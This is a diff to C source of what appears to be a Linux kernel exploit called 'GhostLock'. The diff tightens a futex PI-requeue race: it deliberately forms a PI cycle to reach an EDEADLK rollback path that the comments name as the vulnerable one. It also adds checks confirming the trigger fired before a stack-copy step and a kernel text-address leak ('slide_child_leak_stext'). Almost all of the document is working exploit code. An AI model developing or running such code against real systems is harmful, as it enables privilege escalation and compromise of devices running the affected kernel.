@@ -191,6 +191,8 @@ static uint32_t slide_f_pi_chain;
 static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
+static atomic_int slide_mcast_requeue_ret;
+static atomic_int slide_mcast_requeue_errno;
 static atomic_int slide_route_done;
 static atomic_int slide_waiter_tid;
 static atomic_int slide_consume_calls;
@@ -711,6 +713,25 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
   }
 }
 
+#ifdef TARGET_A15
+/* The original GhostLock trigger deliberately forms a PI cycle:
+ * waiter owns slide_f_pi_chain; owner owns slide_f_pi_target and blocks on
+ * slide_f_pi_chain; CMP_REQUEUE_PI then tries to move waiter onto the target.
+ * The expected result is EDEADLK rollback, which is the vulnerable path being
+ * exercised. The chain WAITERS bit confirms the owner actually queued before
+ * the parent attempts the requeue. */
+static int slide_wait_for_chain_waiter(void) {
+  for (int ms = 0; ms < SLIDE_WAIT_SECONDS * 1000; ms++) {
+    uint32_t chain = __atomic_load_n(&slide_f_pi_chain, __ATOMIC_ACQUIRE);
+    if (chain & FUTEX_WAITERS) {
+      return 1;
+    }
+    usleep(1000);
+  }
+  return 0;
+}
+#endif
+
 void *slide_waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   /* The MCAST PI trigger updates this task's scheduler state from a separate
@@ -745,11 +766,30 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += SLIDE_WAIT_SECONDS;
 
   atomic_store(&slide_waiter_waiting, 1);
-  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
-           &slide_f_pi_target, 0);
-  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-
 #ifdef TARGET_A15
+  errno = 0;
+  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+                           &slide_f_pi_target, 0);
+  int wait_errno = errno;
+  int requeue_ret = atomic_load(&slide_mcast_requeue_ret);
+  int requeue_errno = atomic_load(&slide_mcast_requeue_errno);
+  /* GhostLock needs the intentional cyclic-chain rollback, not a successful
+   * requeue. EDEADLK means the proxy waiter hit the cycle; on the source-wait
+   * path, the waiter then times out without entering the successful-requeue
+   * cleanup path. Refuse MCAST unless both the rollback and timeout occurred.
+   * This proves the trigger branch only; it does not prove the stale waiter
+   * fields, fake page contents, or target write. */
+  if (requeue_ret != -1 || requeue_errno != EDEADLK ||
+      wait_ret != -1 || wait_errno != ETIMEDOUT) {
+    pr_warning("slide MCAST PI handoff rejected requeue=%d/%d "
+               "wait=%ld/%d\n",
+               requeue_ret, requeue_errno, wait_ret, wait_errno);
+    atomic_store(&slide_route_done, 1);
+    return NULL;
+  }
+  pr_info("slide MCAST PI handoff confirmed requeue=%d wait=%ld/%d\n",
+          requeue_ret, wait_ret, wait_errno);
+
   /* MCAST stack writer (mcast-writer-analysis.md). The static model and the
    * 2026-10-21 offset-0x68 dump support 0x78, and one 0x78 run reported
    * boot_id readback. Actual KP44/KP45/KP46 dumps show no stamp markers at the
@@ -758,6 +798,9 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
    * validated. */
   slide_mcast_stack_copy();
 #else
+  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+           &slide_f_pi_target, 0);
+  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   slide_pselect_stack_copy();
 #endif
   atomic_store(&slide_route_done, 1);
@@ -778,7 +821,14 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   }
 
   atomic_store(&slide_owner_started, 1);
-  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  errno = 0;
+  long chain_ret = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL,
+                            NULL, 0);
+  if (chain_ret != 0) {
+    pr_error("slide owner lock chain ret=%ld errno=%d\n", chain_ret,
+             errno);
+    return NULL;
+  }
 
   for (;;) {
     sleep(1);
@@ -874,6 +924,16 @@ uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
+  slide_f_wait = 0;
+  slide_f_pi_target = 0;
+  slide_f_pi_chain = 0;
+  atomic_store(&slide_waiter_ready, 0);
+  atomic_store(&slide_waiter_waiting, 0);
+  atomic_store(&slide_owner_started, 0);
+  atomic_store(&slide_route_done, 0);
+  atomic_store(&slide_waiter_tid, 0);
+  atomic_store(&slide_mcast_requeue_ret, -2);
+  atomic_store(&slide_mcast_requeue_errno, 0);
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
@@ -883,9 +943,24 @@ uint64_t slide_child_leak_stext(void) {
     usleep(1000);
   }
 
-  errno = 0;
-  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-           &slide_f_pi_target, 0);
+  long requeue_ret = -2;
+  int requeue_errno = 0;
+#ifdef TARGET_A15
+  if (slide_wait_for_chain_waiter()) {
+#endif
+    errno = 0;
+    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
+                           (void *)1, &slide_f_pi_target, 0);
+    requeue_errno = errno;
+#ifdef TARGET_A15
+  } else {
+    pr_warning("slide MCAST requeue skipped: owner not queued on chain\n");
+  }
+#endif
+  atomic_store(&slide_mcast_requeue_errno, requeue_errno);
+  atomic_store(&slide_mcast_requeue_ret, (int)requeue_ret);
+  pr_info("slide MCAST PI requeue ret=%ld errno=%d\n",
+          requeue_ret, requeue_errno);
 
   while (!atomic_load(&slide_route_done)) {
     sleep(1);
@@ -907,6 +982,8 @@ static int slide_mcast_custom_route_child(void) {
   atomic_store(&slide_waiter_ready, 0);
   atomic_store(&slide_waiter_waiting, 0);
   atomic_store(&slide_owner_started, 0);
+  atomic_store(&slide_mcast_requeue_ret, -2);
+  atomic_store(&slide_mcast_requeue_errno, 0);
   atomic_store(&slide_route_done, 0);
   atomic_store(&slide_waiter_tid, 0);
   atomic_store(&slide_consume_calls, 0);
@@ -938,9 +1015,24 @@ static int slide_mcast_custom_route_child(void) {
    * writes requeued immediately after both threads reached their gates.
    * An extra 50 ms here changes the lifetime of the stack-resident PI waiter
    * before the MCAST copy and was present only in this custom-target fork. */
-  errno = 0;
-  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-           &slide_f_pi_target, 0);
+  long requeue_ret = -2;
+  int requeue_errno = 0;
+#ifdef TARGET_A15
+  if (slide_wait_for_chain_waiter()) {
+#endif
+    errno = 0;
+    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
+                           (void *)1, &slide_f_pi_target, 0);
+    requeue_errno = errno;
+#ifdef TARGET_A15
+  } else {
+    pr_warning("MCAST requeue skipped: owner not queued on chain\n");
+  }
+#endif
+  atomic_store(&slide_mcast_requeue_errno, requeue_errno);
+  atomic_store(&slide_mcast_requeue_ret, (int)requeue_ret);
+  pr_info("slide MCAST PI requeue ret=%ld errno=%d\n",
+          requeue_ret, requeue_errno);
   while (!atomic_load(&slide_route_done))
     usleep(1000);
 
